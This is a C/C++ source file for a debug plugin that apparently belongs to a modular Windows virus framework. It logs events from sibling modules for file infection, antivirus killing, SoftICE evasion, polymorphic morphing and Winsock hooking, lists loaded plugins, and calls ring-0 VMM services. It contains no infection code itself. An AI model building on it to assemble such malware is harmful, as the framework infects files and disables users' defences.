
#include <windows.h>
#include <stdarg.h>
#pragma hdrstop

namespace PLUGIN {
extern "C" {

#include "..\..\INCLUDE\pe.hpp"
#include "..\..\INCLUDE\PGN2\pgn2.hpp"
#include "debug.hpp"
#include "..\LDRWIN32\ldrwin32.hpp"
#include "..\PLAN\plan.hpp"
#include "..\INFECTA\infecta.hpp"
#include "..\INFECTB\infectb.hpp"
#include "..\KILLER\killer.hpp"
#include "..\FILEIO\fileio.hpp"
#include "..\MAIN\main.hpp"
#include "..\R0COPY\r0copy.hpp"
#include "..\IFSHAN\ifshan.hpp"
#include "..\RECSERCH\recserch.hpp"
#include "..\REGSCAN\regscan.hpp"
#include "..\EXTMAN\extman.hpp"
#include "..\IOHOOKER\iohooker.hpp"
#include "..\IOAVFILT\ioavfilt.hpp"
#include "..\MAKEBODY\makebody.hpp"
#include "..\RSA\rsa.hpp"
#include "..\ADDPGN\addpgn.hpp"
#include "..\FUCKICE\fuckice.hpp"
#include "..\WALKER\walker.hpp"
#include "..\KILLAVXD\killavxd.hpp"
#include "..\AAVFILE\aavfile.hpp"
#include "..\EXAMPLE\example.hpp"
#include "..\KME\kme.hpp"

void __export __cdecl printf(char* fmt, ...)
{
  char s[1024];

  va_list ap;
  va_start(ap, fmt);
  if (_CS != 0x28)
    wvsprintf(s, fmt, ap);
  else
  {
    asm
    {
      pusha
      push ap
      push fmt
      lea eax, s
      push eax
      db 0CDh,20h
      dw 0197h    // vsprintf
      dw 0001h    // VMM
      add esp, 3*4
      popa
    }
  }
  va_end(ap);

  if (_CS != 0x28)
    OutputDebugString(s);
  else
  {
    asm
    {
      pusha
      lea esi, s
      db 0CDh,20h
      dw 00C2h  // Out_Debug_String
      dw 0001h  // VMM
      popa
    }
  }

}

void list_plugins()
{
  list_entry* l = GetPluginList();      // imported from LDRWIN32 plugin
  int i=1;
  printf("## --phys-- --virt-- --csize- --dsize- --vsize- ---id--- vr p ue ----name----\n");
  while (l)
  {
    PE_HEADER* pe = (PE_HEADER*) l->list_virt;
    printf("%02X %08X %08X %08X %08X %08X %08X %02X %01X %s%s ",
       i++,
       l->list_phys,
       l->list_virt,
       l->list_phys->pgn2_compressed,
       l->list_phys->pgn2_decompressed,
       l->list_virt ? ((PE_HEADER*)l->list_virt)->pe_imagesize : 0,
       l->list_phys->pgn2_id,
       l->list_phys->pgn2_version,
       l->list_virt ? ((PE_HEADER*)l->list_virt)->pe_priority : 0,
       l->list_virt ? (  ((PE_HEADER*)l->list_virt)->pe_dynflags & FL_PGN2_UNRESOLVED ? "U":"-" ) : "?",
       l->list_virt ? (  ((PE_HEADER*)l->list_virt)->pe_dynflags & FL_PGN2_SEHERROR   ? "E":"-" ) : "?"
      );
    if (l->list_virt)
    {
      if (pe->pe_exportrva)
        printf( (char*)(pe->pe_imagebase + ((PE_EXPORT*)(pe->pe_imagebase + pe->pe_exportrva))->ex_namerva) );
      else
        printf("$noexport$");
    }
    else
    {
      printf("$noimage$");
    }
    printf("\n");
    l=l->list_next;
  }
}//list_plugins

int __export __cdecl HandleEvent(DWORD EventID, DWORD UserParam)
{

  printf("%04X H.E. -- ", _CS);
  switch (EventID)
  {
    case EV_LDRWIN32_STARTUP:   printf("EV_LDRWIN32_STARTUP\n"); break;
    case EV_KILLER_DO_FUCKUP:   printf("EV_KILLER_DO_FUCKUP\n"); break;
    case EV_EXAMPLE_IN_EVENT:   printf("EV_EXAMPLE_IN_EVENT\n"); break;
    case EV_EXAMPLE_OUT_EVENT:   printf("EV_EXAMPLE_OUT_EVENT\n"); break;
    case EV_IOAVFILT_BLOCKED:   printf("EV_IOAVFILT_BLOCKED\n"); break;
    case EV_AAVFILE_PATCHED:   printf("EV_AAVFILE_PATCHED\n"); break;
    case EV_FUCKICE_PATCHED:   printf("EV_FUCKICE_PATCHED\n"); break;
    case EV_FUCKICE_TRACING:   printf("EV_FUCKICE_TRACING\n"); break;
    case EV_KILLAVXD_PATCHED:   printf("EV_KILLAVXD_PATCHED\n"); break;
    case EV_WALKER_PATCHED:   printf("EV_WALKER_PATCHED\n"); break;
    case EV_LDRWIN32_ATTACHED: printf("EV_LDRWIN32_ATTACHED\n"); list_plugins(); break;
    case EV_LDRWIN32_SEHERROR: printf("EV_LDRWIN32_SEHERROR\n"); list_plugins(); break;
    case EV_LDRWIN32_DETACHED: printf("EV_LDRWIN32_DETACHED\n"); list_plugins(); break;
    case EV_INFECTA_INFECTFILE:  printf("EV_INFECTA_INFECTFILE -- %s\n", (void*)UserParam); break;
    case EV_INFECTB_INFECTFILE:  printf("EV_INFECTB_INFECTFILE -- %s\n", (void*)UserParam); break;
    case EV_IFSHAN_GOT_FILENAME: printf("EV_IFSHAN_GOT_FILENAME -- %s\n", (void*)UserParam); break;
    case EV_RECSERCH_GOT_FILENAME: printf("EV_RECSERCH_GOT_FILENAME -- %s\n", (void*)UserParam); break;
    case EV_REGSCAN_GOT_FILENAME: printf("EV_REGSCAN_GOT_FILENAME -- %s\n", (void*)UserParam); break;
    case EV_EXTMAN_GOT_FILENAME: printf("EV_EXTMAN_GOT_FILENAME -- %s [%s] %01X\n", *(DWORD*)UserParam, UserParam+8, *(DWORD*)(UserParam+12) ); break;
    case EV_PLAN_PER_MACHINE:   printf("EV_PLAN_PER_MACHINE\n"); break;
    case EV_PLAN_PER_SESSION:   printf("EV_PLAN_PER_SESSION\n"); break;
    case EV_ADDPGN_GETKEY:   printf("EV_ADDPGN_GETKEY\n"); break;
    case EV_PLAN_PER_PROCESS:
      printf("EV_PLAN_PER_PROCESS -- %s\n",
        UserParam == PLAN_STDFILE ? "STDFILE" :
        UserParam == PLAN_EXPLORER? "EXPLORER" :
        UserParam == PLAN_WINSOCK ? "WINSOCK" :
        UserParam == PLAN_ARCDROPPER ? "ARCDROPPER" :
        "?");
      break;
    case EV_MAIN_IDLE:   printf("EV_MAIN_IDLE\n"); break;
    case EV_R0COPY_IDLE: printf("EV_R0COPY_IDLE\n"); break;
    case EV_MAKEBODY_MORPH: printf("EV_MAKEBODY_MORPH\n"); break;
    case EV_IOHOOKER_ON_SEND: printf("EV_IOHOOKER_ON_SEND\n"); break;
    case EV_IOHOOKER_ON_RECV: printf("EV_IOHOOKER_ON_RECV\n"); break;
    case EV_IOHOOKER_ON_CONNECT: printf("EV_IOHOOKER_ON_CONNECT\n"); break;
    default:
      printf("unknown (%08X,%08X)\n", EventID, UserParam);
  }

  return 0;
}//handleevent

void __cdecl EntryPoint(DWORD)
{
  if (_CS!=0x28)
  if (MessageBoxA(NULL,"Are you sure?","DEBUG.PGN",
                  MB_YESNO+MB_ICONQUESTION+MB_DEFBUTTON1+MB_TASKMODAL)
                  != IDYES)
  {
    ExitProcess(-1);
  }

  printf("DEBUG: EntryPoint\n");
  list_plugins();
}

}; // extern "C"
}; // namespace PLUGIN
